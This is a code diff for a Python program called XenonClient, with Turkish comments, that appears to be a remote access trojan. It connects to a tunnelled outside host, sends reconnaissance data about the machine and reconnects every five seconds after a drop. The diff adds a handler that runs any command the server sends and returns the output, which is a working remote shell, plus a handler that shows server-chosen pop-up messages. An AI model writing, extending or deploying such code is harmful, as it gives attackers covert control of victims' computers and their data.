@@ -25,31 +25,34 @@ class XenonClient:
             try:
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.connect((self.server_ip, self.server_port))
-                
-                recon_packet = self.get_recon_data()
-                self.sock.send(json.dumps(recon_packet).encode("utf-8"))
+                # İlk veri gönderimi
+                self.sock.send(json.dumps(self.get_recon_data()).encode("utf-8"))
                 
                 while True:
-                    data = self.sock.recv(1024).decode("utf-8")
+                    data = self.sock.recv(4096).decode("utf-8")
                     if not data: break
                     
-                    if data == "message":
-                        root = tk.Tk()
-                        root.withdraw()
-                        root.attributes("-topmost", True)
-                        messagebox.showwarning("Xenon System", "Bu cihaz bir güvenlik denetimi altındadır.")
+                    # KOMUT AYRIŞTIRICI
+                    if data.startswith("msg|"):
+                        msg_content = data.split("|")[1]
+                        root = tk.Tk(); root.withdraw(); root.attributes("-topmost", True)
+                        messagebox.showinfo("Xenon System", msg_content)
                         root.destroy()
                     
-                    elif data == "shell":
-                        print("[*] Remote Shell talebi alındı.")
-                        # Buraya ileride CMD çıktısı gönderen kod gelecek
+                    elif data.startswith("shell|"):
+                        cmd = data.split("|")[1]
+                        # Komutu çalıştır ve çıktıyı al
+                        output = subprocess.getoutput(cmd)
+                        if not output: output = "Komut çalıştırıldı (Çıktı yok)."
+                        self.sock.send(output.encode("utf-8"))
 
             except:
-                time.sleep(5)
+                time.sleep(5) # Bağlantı koparsa 5 sn bekle
             finally:
                 try: self.sock.close()
                 except: pass
 
 if __name__ == "__main__":
-    client = XenonClient("uwtd3ffva.localto.net", 6827)
+    client = XenonClient("uwtd3ffva.localto.net", 6522)
     client.run()
+
